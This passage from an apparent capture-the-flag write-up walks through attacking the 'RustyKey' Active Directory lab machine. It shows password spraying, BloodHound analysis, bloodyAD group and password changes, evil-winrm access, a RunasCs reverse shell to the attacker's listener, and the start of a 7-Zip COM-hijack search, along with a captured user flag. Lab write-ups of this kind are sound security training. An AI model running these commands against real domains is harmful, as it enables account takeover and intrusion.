+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               502: RUSTYKEY\krbtgt (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               512: RUSTYKEY\Domain Admins (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               513: RUSTYKEY\Domain Users (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               514: RUSTYKEY\Domain Guests (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               515: RUSTYKEY\Domain Computers (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               516: RUSTYKEY\Domain Controllers (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               517: RUSTYKEY\Cert Publishers (SidTypeAlias)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               518: RUSTYKEY\Schema Admins (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               519: RUSTYKEY\Enterprise Admins (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               520: RUSTYKEY\Group Policy Creator Owners (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               521: RUSTYKEY\Read-only Domain Controllers (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               522: RUSTYKEY\Cloneable Domain Controllers (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               525: RUSTYKEY\Protected Users (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               526: RUSTYKEY\Key Admins (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               527: RUSTYKEY\Enterprise Key Admins (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               553: RUSTYKEY\RAS and IAS Servers (SidTypeAlias)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               571: RUSTYKEY\Allowed RODC Password Replication Group (SidTypeAlias)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               572: RUSTYKEY\Denied RODC Password Replication Group (SidTypeAlias)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1000: RUSTYKEY\DC$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1101: RUSTYKEY\DnsAdmins (SidTypeAlias)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1102: RUSTYKEY\DnsUpdateProxy (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1103: RUSTYKEY\Support-Computer1$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1104: RUSTYKEY\Support-Computer2$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1105: RUSTYKEY\Support-Computer3$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1106: RUSTYKEY\Support-Computer4$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1107: RUSTYKEY\Support-Computer5$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1118: RUSTYKEY\Finance-Computer1$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1119: RUSTYKEY\Finance-Computer2$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1120: RUSTYKEY\Finance-Computer3$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1121: RUSTYKEY\Finance-Computer4$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1122: RUSTYKEY\Finance-Computer5$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1123: RUSTYKEY\IT-Computer1$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1124: RUSTYKEY\IT-Computer2$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1125: RUSTYKEY\IT-Computer3$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1126: RUSTYKEY\IT-Computer4$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1127: RUSTYKEY\IT-Computer5$ (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1128: RUSTYKEY\HelpDesk (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1130: RUSTYKEY\Protected Objects (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1131: RUSTYKEY\IT (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1132: RUSTYKEY\Support (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1133: RUSTYKEY\Finance (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1136: RUSTYKEY\DelegationManager (SidTypeGroup)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1137: RUSTYKEY\rr.parker (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1138: RUSTYKEY\mm.turner (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1139: RUSTYKEY\bb.morgan (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1140: RUSTYKEY\gg.anderson (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1143: RUSTYKEY\dd.ali (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1145: RUSTYKEY\ee.reed (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               1146: RUSTYKEY\nn.marcos (SidTypeUser)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               3601: RUSTYKEY\backupadmin (SidTypeUser)
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>After getting a full list, I used some <code>awk</code> and <code>grep</code> magic to clean it up, leaving me with a nice list of usernames and computer accounts in <code>users.txt</code>. Then, I launched the password spraying attack.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb dc.rustykey.htb <span class="flag">-u</span> users.txt <span class="flag">-p</span> <span class="string">'Rusty88!'</span> <span class="flag">-k</span> <span class="flag">--continue-on-success</span>
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-info">[*]</span>  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\Administrator:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\backupadmin:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\bb.morgan:Rusty88! KDC_ERR_ETYPE_NOSUPP 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\DC$:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\dd.ali:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\ee.reed:Rusty88! KDC_ERR_ETYPE_NOSUPP 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\Finance-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\Finance-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\Finance-Computer3$:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\Finance-Computer4$:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\Finance-Computer5$:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\gg.anderson:Rusty88! KDC_ERR_CLIENT_REVOKED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\Guest:Rusty88! KDC_ERR_CLIENT_REVOKED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\IT-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\IT-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-success">[+]</span> rustykey.htb\IT-Computer3$:Rusty88! 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\IT-Computer4$:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\IT-Computer5$:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\krbtgt:Rusty88! KDC_ERR_CLIENT_REVOKED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\mm.turner:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\nn.marcos:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\rr.parker:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\Support-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\Support-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\Support-Computer3$:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\Support-Computer4$:Rusty88! KDC_ERR_PREAUTH_FAILED 
+<span class="smb">SMB</span>         dc.rustykey.htb 445    dc               <span class="indicator-error">[-]</span> rustykey.htb\Support-Computer5$:Rusty88! KDC_ERR_PREAUTH_FAILED 
+...
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>And we got a hit! The password <code>Rusty88!</code> belongs to the machine account <code>IT-Computer3$</code>.</p>
+<hr>
+<h1 id="privilege-escalation--lateral-movement-ta0004-ta0008">Privilege Escalation &amp; Lateral Movement (TA0004, TA0008)<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation--lateral-movement-ta0004-ta0008">#</a></h1>
+<h3 id="bloodhound-analysis-t1069">BloodHound Analysis (T1069)<a hidden class="anchor" aria-hidden="true" href="#bloodhound-analysis-t1069">#</a></h3>
+<p>With new credentials for a machine account, it was time to fire up BloodHound to see what <code>IT-Computer3$</code> could do. I ran the Python collector and imported the data.</p>
+<p>The first thing I noticed was a direct path to add the machine account to the HELPDESK group.</p>
+<img src="/img/rustykey/1.png" alt="" class="img-responsive" loading="lazy" />
+<p>The IT-Computer3$ account has <code>AddSelf</code> permissions on the HELPDESK group. Looking at the HELPDESK group&rsquo;s outbound permissions, it has <code>ForceChangePassword</code> rights over several users.</p>
+<img src="/img/rustykey/2.png" alt="" class="img-responsive" loading="lazy" />
+<p>I checked the privileges for these users and found that bb.morgan, gg.anderson, and ee.reed were members of the IT group and could use WinRM because they are in the Remote Management Users group.</p>
+<img src="/img/rustykey/3.png" alt="" class="img-responsive" loading="lazy" />
+<p>However, there&rsquo;s a catch: these users are part of a group that is a member of <code>Protected Objects</code>. This means we likely can&rsquo;t change their passwords directly. The solution is to first remove their group (<code>IT</code> or <code>Support</code>) from the <code>Protected Objects</code> group, which <code>HELPDESK</code> has the rights to do.</p>
+<p>Finally, I ran a custom Cypher query to look for interesting users and found mm.turner:</p>
+<pre tabindex="0"><code class="language-cypher" data-lang="cypher">CYPHER
+MATCH (u:User) RETURN u
+</code></pre><img src="/img/rustykey/4.png" alt="" class="img-responsive" loading="lazy" />
+<p>This user is a member of the <code>DelegationManager</code> group, which has <code>AddAllowedToAct</code> permissions on the domain controller itself. This is a clear path to domain admin via Resource-Based Constrained Delegation (RBCD).</p>
+<img src="/img/rustykey/5.png" alt="" class="img-responsive" loading="lazy" />
+<p>With this attack path visualized, it was time to execute.</p>
+<h3 id="gaining-user-access-via-password-reset-t1098">Gaining User Access via Password Reset (T1098)<a hidden class="anchor" aria-hidden="true" href="#gaining-user-access-via-password-reset-t1098">#</a></h3>
+<p>First, I got a TGT for our machine account.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">getTGT.py</span> rustykey.htb/IT-Computer3$:'Rusty88!'                                  
+/opt/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="indicator-info">[*]</span> Saving ticket in IT-Computer3$.ccache
+
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">export</span> KRB5CCNAME=$(pwd)/IT-Computer3\$.ccache
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Next, I used <code>bloodyAD</code> to add <code>IT-Computer3$</code> to the <code>HELPDESK</code> group.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">bloodyAD</span> <span class="flag">--host</span> dc.rustykey.htb <span class="flag">-d</span> rustykey.htb <span class="flag">-u</span> <span class="string">'IT-Computer3$'</span> <span class="flag">-p</span> <span class="string">'Rusty88!'</span> <span class="flag">-k</span> add groupMember HELPDESK <span class="string">'IT-COMPUTER3$'</span>
+<span class="indicator-success">[+]</span> IT-COMPUTER3$ added to HELPDESK
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Now as a member of <code>HELPDESK</code>, I removed the <code>IT</code> group from <code>Protected Objects</code>.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">bloodyAD</span> <span class="flag">--host</span> dc.rustykey.htb <span class="flag">-d</span> rustykey.htb <span class="flag">-u</span> <span class="string">'IT-Computer3$'</span> <span class="flag">-p</span> <span class="string">'Rusty88!'</span> <span class="flag">-k</span> remove groupMember <span class="string">'Protected Objects'</span> <span class="string">'IT'</span>
+<span class="indicator-error">[-]</span> IT removed from Protected Objects
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>With the protection removed, I could change <code>bb.morgan</code>&rsquo;s password.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">bloodyAD</span> <span class="flag">--host</span> dc.rustykey.htb <span class="flag">-d</span> rustykey.htb <span class="flag">-u</span> <span class="string">'IT-Computer3$'</span> <span class="flag">-k</span> <span class="flag">-p</span> <span class="string">'Rusty88!'</span> set password <span class="string">'bb.morgan'</span> <span class="string">'@Password123!'</span>
+<span class="indicator-success">[+]</span> Password changed successfully!
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Then, I got a TGT for <code>bb.morgan</code> and used <code>evil-winrm</code> to get a shell.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">getTGT.py</span> rustykey.htb/bb.morgan:'@Password123!'
+Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="indicator-info">[*]</span> Saving ticket in bb.morgan.ccache
+
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">export</span> KRB5CCNAME=bb.morgan.ccache
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">evil-winrm</span> <span class="flag">-i</span> dc.rustykey.htb <span class="flag">-r</span> rustykey.htb                                                       
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span style="color: red;">*Evil-WinRM*</span> <span style="color: orange; font-weight: bold">PS</span> PS C:\Users\bb.morgan\Documents> cd ..
+<span style="color: red;">*Evil-WinRM*</span> <span style="color: orange; font-weight: bold">PS</span> PS C:\Users\bb.morgan> tree /f
+Folder PATH listing
+Volume serial number is 00BA-0DBE
+C:.
+ÃÄÄÄDesktop
+³       internal.pdf
+³       user.txt
+³
+ÃÄÄÄDocuments
+ÃÄÄÄDownloads
+ÃÄÄÄFavorites
+ÃÄÄÄLinks
+ÃÄÄÄMusic
+ÃÄÄÄPictures
+ÃÄÄÄSaved Games
+ÀÄÄÄVideos
+<span style="color: red;">*Evil-WinRM*</span> <span style="color: orange; font-weight: bold">PS</span> PS C:\Users\bb.morgan> cd Desktop
+<span style="color: red;">*Evil-WinRM*</span> <span style="color: orange; font-weight: bold">PS</span> PS C:\Users\bb.morgan\Desktop> type user.txt
+ef5edae78dbbff44a6e3972d29226adf
+<span style="color: red;">*Evil-WinRM*</span> <span style="color: orange; font-weight: bold">PS</span> PS C:\Users\bb.morgan\Desktop> download internal.pdf
+
+Info: Downloading C:\Users\bb.morgan\Desktop\internal.pdf to internal.pdf
+
+Info: Download successful!
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>I grabbed the user flag and downloaded an interesting PDF from the desktop.</p>
+
+<div class="ctf-flag-container">
+    <div class="flag-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 4V20H6V15H14L13 13H20V4H4Z" fill="currentColor"/>
+        </svg>
+    </div>
+    <div class="flag-content">
+        
+User flag: ef5edae78dbbff44a6e3972d29226adf
+
+    </div>
+</div>
+
+<style>
+.ctf-flag-container {
+    display: flex;
+    align-items: center;
+    background-color: #2d3d1a;
+    color: #9fef00;
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin: 16px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    border: 1px solid #4a5d2a;
+}
+
+.flag-icon {
+    margin-right: 12px;
+    color: #9fef00;
+    flex-shrink: 0;
+}
+
+.flag-content {
+    flex: 1;
+    word-break: break-all;
+}
+
+.flag-content code {
+    background-color: transparent;
+    color: inherit;
+    padding: 0;
+    font-size: inherit;
+}
+</style>
+<hr>
+<h1 id="com-hijacking-for-privilege-escalation-t1546015">COM Hijacking for Privilege Escalation (T1546.015)<a hidden class="anchor" aria-hidden="true" href="#com-hijacking-for-privilege-escalation-t1546015">#</a></h1>
+<p>I opened the <code>internal.pdf</code> file I downloaded:</p>
+<img src="/img/rustykey/6.png" alt="" class="img-responsive" loading="lazy" />
+<p>It&rsquo;s a memo from <code>bb.morgan</code> to the support team about a new archiving utility. This immediately screams some kind of DLL or COM hijacking opportunity. The memo mentions the <code>Support</code> group, so I checked its members in BloodHound and found <code>ee.reed</code>. Since I&rsquo;m effectively in the <code>HELPDESK</code> group, I can change <code>ee.reed</code>&rsquo;s password too.</p>
+<img src="/img/rustykey/7.png" alt="" class="img-responsive" loading="lazy" />
+<p>First, I had to re-add my machine account to the <code>HELPDESK</code> group, as a cleanup script on the server seems to revert these changes periodically.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">bloodyAD</span> <span class="flag">--host</span> dc.rustykey.htb <span class="flag">-d</span> rustykey.htb <span class="flag">-u</span> <span class="string">'IT-Computer3$'</span> <span class="flag">-p</span> <span class="string">'Rusty88!'</span> <span class="flag">-k</span> add groupMember HELPDESK <span class="string">'IT-COMPUTER3$'</span>            
+<span class="indicator-success">[+]</span> IT-COMPUTER3$ added to HELPDESK
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Then, I removed the <code>SUPPORT</code> group from <code>Protected Objects</code>.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">bloodyAD</span> <span class="flag">--host</span> dc.rustykey.htb <span class="flag">-d</span> rustykey.htb <span class="flag">-u</span> <span class="string">'IT-Computer3$'</span> <span class="flag">-p</span> <span class="string">'Rusty88!'</span> <span class="flag">-k</span> remove groupMember <span class="string">'Protected Objects'</span> <span class="string">'SUPPORT'</span>
+<span class="indicator-error">[-]</span> SUPPORT removed from Protected Objects
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>With the protection gone, I changed <code>ee.reed</code>&rsquo;s password:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">bloodyAD</span> <span class="flag">--host</span> dc.rustykey.htb <span class="flag">-d</span> rustykey.htb <span class="flag">-u</span> <span class="string">'IT-Computer3$'</span> <span class="flag">-p</span> <span class="string">'Rusty88!'</span> <span class="flag">-k</span> set password <span class="string">'ee.reed'</span> <span class="string">'@Password123!'</span>          
+<span class="indicator-success">[+]</span> Password changed successfully!
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>WinRM didn&rsquo;t work for <code>ee.reed</code>, so instead I used <code>RunasCS</code> from my <code>bb.morgan</code> shell to get a reverse shell as the user.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color: red;">*Evil-WinRM*</span> <span style="color: orange; font-weight: bold">PS</span> .\runas.exe ee.reed <span class="string">'@Password123!'</span> powershell.exe <span class="flag">-r</span> 10.10.14.157:9001
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>On my listener, I got the shell:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@rustykey: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">rlwrap</span> nc <span class="flag">-lnvp</span> 9001
+listening on [any] 9001 ...
+connect to [10.10.14.157] from (UNKNOWN) [10.10.11.75] 54235
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> whoami
+whoami
+rustykey\ee.reed
+PS C:\Windows\system32>
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>From this new shell, I checked for the archiving tool mentioned in the memo:
+<div class="terminal powershell">
+    <div class="terminal-header">
+      <div class="window-controls">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot green"></span>
+      </div>
+      <div class="terminal-title">C:\Users\0xblivion&gt;</div>
+    </div>
+    <div class="terminal-content">
+      <pre><code>
+PS C:\Windows\system32> ls \progra~1
+
+
+    Directory: C:\Program Files
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       12/26/2024   8:24 PM                7-Zip
+d-----       12/26/2024   4:28 PM                Common Files
+d-----        6/24/2025   9:59 AM                internet explorer
+d-----       12/26/2024   4:28 PM                VMware
+d-r---        5/30/2025   3:02 PM                Windows Defender
+d-----        6/24/2025   9:59 AM                Windows Defender Advanced Threat Protection
+d-----        11/5/2022  12:03 PM                Windows Mail
+d-----         6/5/2025   7:54 AM                Windows Media Player
+d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
+d-----        9/15/2018  12:28 AM                windows nt
+d-----        11/5/2022  12:03 PM                Windows Photo Viewer
+d-----        9/15/2018  12:19 AM                Windows Portable Devices
+d-----        9/15/2018  12:19 AM                Windows Security
+d-----        9/15/2018  12:19 AM                WindowsPowerShell
+
+</code></pre>
+    </div>
+  </div>
+  </p>
+<p>It&rsquo;s 7-Zip. Now to find the COM hijacking vulnerability. I searched online for 7-Zip&rsquo;s CLSID and found it was likely <code>{23170F69-40C1-278A-1000-000100020000}</code>.</p>
+<img src="/img/rustykey/8.png" alt="" class="img-responsive" loading="lazy" />
+<p>I verified this with a registry query:</p>
+<div class="terminal powershell">
+    <div class="terminal-header">
+      <div class="window-controls">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot green"></span>
+      </div>
+      <div class="terminal-title">C:\Users\0xblivion&gt;</div>
+    </div>
+    <div class="terminal-content">
+      <pre><code>
+PS C:\Windows\system32> reg query "HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}" /s
+reg query "HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}" /s
+
